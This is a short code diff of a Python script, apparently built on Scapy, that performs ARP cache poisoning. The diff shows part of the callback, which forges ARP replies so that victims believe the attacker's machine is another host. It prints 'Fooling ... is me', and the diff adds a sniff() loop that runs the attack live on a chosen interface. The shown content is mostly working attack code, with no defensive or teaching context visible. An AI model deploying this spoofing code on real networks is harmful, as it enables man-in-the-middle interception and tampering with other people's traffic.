@@ -18,7 +18,11 @@ def arp_poison_callback( packet):
         answer[ARP].psrc = packet[ARP].pdst
         answer[ARP].pdst = packet[ARP].psrc
 
-        print("Fooling " + packet[ ARP].psrc + " that " + \ 
-              packet[ARP].pdst + " is me")
+        print("Fooling " + packet[ ARP].psrc + " that " + packet[ARP].pdst + " is me")
 
         sendp(answer , iface=sys.argv[1])
+
+sniff(prn =arp_poison_callback ,
+      filter="arp",
+      iface=sys.argv[1],
+      store=0)
